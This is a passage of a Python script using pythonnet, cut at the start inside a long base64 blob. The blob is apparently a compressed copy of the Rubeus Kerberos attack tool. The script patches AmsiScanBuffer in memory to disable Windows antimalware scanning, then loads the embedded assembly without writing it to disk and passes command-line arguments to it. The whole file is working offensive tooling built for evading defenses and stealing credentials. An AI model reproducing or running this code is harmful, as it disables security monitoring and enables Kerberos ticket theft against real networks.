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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()